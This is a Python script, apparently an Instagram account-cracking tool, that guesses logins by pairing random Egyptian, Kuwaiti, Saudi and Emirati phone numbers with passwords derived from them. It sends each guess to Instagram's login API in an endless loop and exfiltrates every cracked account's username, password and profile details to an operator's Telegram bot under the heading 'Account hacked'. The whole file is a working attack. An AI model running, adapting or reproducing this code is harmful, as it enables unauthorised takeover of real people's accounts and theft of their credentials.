from time import sleep
import webbrowser, random, requests, user_agent, json
from secrets import token_hex
import secrets, sys, uuid
from uuid import uuid4
from time import sleep
import webbrowser, time
import webbrowser
webbrowser.open('https://t.me/D1EE')
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
Z2 = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;39m'
C = '\x1b[2;35m'
aa = 1
zz = 0
print(B + '_____________________________________________')
print(X + ' \x1b[2;35m\x1b[2;35m""\x1b[1;33m   \n \x1b[1;33m\n\x1b[2;36m   \n\x1b[2;36m\n\x1b[2;32m')
print(B + '_____________________________________________')
print(C + '\n012Egypt\n010Egypt\n011Egypt\nالكويت ✓1\n\nالسعودية ✓2\n\n الامارات العربية ✓3  ')
print(F + '_____________________________________________')
Extra = input(B + '  ⌯ اختار رقم :  ')
extra2 = input(B + '  ™ TOKN  :  ')
extra1 = input(B + '  ™ ID : ')
print(F + '_____________________________________________')
import time
t = time.localtime()
current_time = time.strftime('%H:%M:%S', t)
start_msg = requests.post(f"https://api.telegram.org/bot{extra2}/sendMessage?chat_id={extra1}&text=⌯ Wait... .").json()
id_msg = start_msg['result']['message_id']

def code_EXTRA(userI, password):
    cookie = secrets.token_hex(8) * 2
    head = {'HOST':'www.instagram.com', 
     'KeepAlive':'True', 
     'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
     'Cookie':'cookie', 
     'Accept':'*/*', 
     'ContentType':'application/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'936619743392459', 
     'X-Instagram-AJAX':'missing', 
     'X-CSRFToken':'missing', 
     'Accept-Language':'en-US,en;q=0.9'}
    url_id = f"https://www.instagram.com/{userI}/?__a=1"
    req_id = requests.get(url_id, headers=head).json()
    name = str(req_id['graphql']['user']['full_name'])
    id = str(req_id['graphql']['user']['id'])
    followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
    following = str(req_id['graphql']['user']['edge_follow']['count'])
    isp = str(req_id['graphql']['user']['is_private'])
    idd = str(req_id['graphql']['user']['id'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
    ree = re.json()
    dat = ree['data']
    eXtra = B + f"\n\n𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝚑𝚊𝚌𝚔𝚎𝚍\n««««««««««««\n✓الاسم : {name} .\n✓اليوزر : {userI} .\n✓الباسورد : {password} .\n✓متابعينة : {followes} .\n✓متابع : {following} .\n✓تاريخ الانشاء : {dat} .\ ︽︽︽︽︽︽︽︽︽︽\nمطـور @D1EEB\n "
    tlg = f"https://api.telegram.org/bot{extra2}/sendMessage?chat_id={extra1}&text={eXtra}"
    i = requests.post(tlg)
    print(G + eXtra)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)', 
 'Accept':'*/*', 
 'Cookie':'missing', 
 'Accept-Encoding':'gzip, deflate', 
 'Accept-Language':'en-US', 
 'X-IG-Capabilities':'3brTvw==', 
 'X-IG-Connection-Type':'WIFI', 
 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
 'Host':'i.instagram.com'}
user = '1209348756'
while True:
    if Extra == '012':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2012' + us
        password = '012' + us
    if Extra == '010':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2010' + us
        password = '010' + us
    if Extra == '011':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2011' + us
        password = '011' + us
    if Extra == '1':
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96567' + us
        password = '67' + us
    if Extra == '2':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+96650' + us
        password = '050' + us
    if Extra == '3':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+97150' + us
        password = '050' + us
    uid = str(uuid4())
    data = {'uuid':uid, 
     'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
    req = requests.post(url, headers=headers, data=data)
    if 'logged_in_user' in req.json():
        zz += 1
        userQ = req.json()['logged_in_user']['username']
        code_EXTRA(userQ, password)
    elif '"message":"challenge_required","challenge"' in req.json():
        print(S + 'username : ' + username + ': password : ' + password)
    else:
        requests.post(f"https://api.telegram.org/bot{extra2}/editmessagetext?chat_id={extra1}&message_id={id_msg}&text=⌯ᏙᏆᏢ ᎠᎬᎬᏴ: .\n .  . \n ⌯ Hunt [{zz}]\n                        (: {username} :)\n⌯ Text [{aa}] \n.  .\n⌯  : ᎻᎪᏟᏦᏆΝᏀ ᏆΝ ᏢᎡϴᏀᎡᎬՏՏ")
        print(E + 'username : ' + username + ': password : ' + password)
        aa += 1
